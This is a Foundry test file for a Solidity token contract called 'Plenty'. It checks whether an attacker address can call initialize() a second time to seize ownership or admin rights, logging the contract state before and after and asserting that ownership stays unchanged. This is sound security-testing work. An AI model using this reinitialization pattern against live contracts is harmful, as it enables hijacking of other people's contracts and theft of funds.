// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/Plenty.sol";

contract MockRouter {
    address public _factory;
    address public _weth;
    
    constructor(address factory_, address weth_) {
        _factory = factory_;
        _weth = weth_;
    }
    
    function factory() external view returns (address) {
        return _factory;
    }
    
    function WETH() external view returns (address) {
        return _weth;
    }
}

contract MockFactory {
    function createPair(address, address) external pure returns (address) {
        return address(0);
    }
}

contract PlentyReinitializationTest is Test {
    Plenty plenty;
    address deployer = address(0x11);
    address attacker = address(0x22);
    MockRouter router1;
    address buyBack = address(0x33);
    MockFactory factory;
    
    function setUp() public {
        vm.startPrank(deployer);
        factory = new MockFactory();
        router1 = new MockRouter(address(factory), address(0));
        plenty = new Plenty();
        vm.stopPrank();
    }

    function test_ProperInitialization() public {
        vm.prank(deployer);
        plenty.initialize(address(router1), buyBack);
        
        assertEq(plenty.owner(), deployer, "Owner should be deployer");
        assertTrue(plenty.isWhitelistAdmin(deployer), "Deployer should be admin");
    }

    function test_AttackReinitialization() public {
        // First proper initialization
        vm.prank(deployer);
        plenty.initialize(address(router1), buyBack);
        
        console.log("--- BEFORE-Trigger Reinitialization ---");
        address ownerBefore = plenty.owner();
        bool attackerAdminBefore = plenty.isWhitelistAdmin(attacker);
        console.log("Owner Before: ", ownerBefore);
        console.log("Attacker Admin Before: ", attackerAdminBefore);

        console.log("--- Trigger Reinitialization ---");
        bytes memory callData = abi.encodeWithSignature(
            "initialize(address,address)", 
            address(router1), 
            buyBack
        );
        vm.prank(attacker);
        (bool success, ) = address(plenty).call(callData);
        if (success) {
            console.log("Attack Result: Succeeded without revert");
        } else {
            console.log("Attack Result: Reverted");
        }

        console.log("--- AFTER-Trigger Reinitialization ---");
        address ownerAfter = plenty.owner();
        bool attackerAdminAfter = plenty.isWhitelistAdmin(attacker);
        console.log("Owner After: ", ownerAfter);
        console.log("Attacker Admin After: ", attackerAdminAfter);

        bool ownerChanged = (ownerBefore != ownerAfter);
        bool adminChanged = (attackerAdminBefore != attackerAdminAfter);
        bool stateChanged = ownerChanged || adminChanged;
        
        if (stateChanged) {
            console.log("Vulnerability Exists: Attack changed contract ownership/permissions");
        } else {
            console.log("Vulnerability not Exist: Contract state remains secure");
        }

        // Final vulnerability verdict
        if (stateChanged) {
            console.log("Vulnerability Exists: Attackers can hijack contract via reinitialization");
        } else {
            console.log("Vulnerability not Exist: Reinitialization protection works correctly");
        }

        // Original test assertions remain
        assertEq(plenty.owner(), deployer, "Owner should remain deployer");
        assertFalse(plenty.isWhitelistAdmin(attacker), "Attacker should not be admin");
    }
}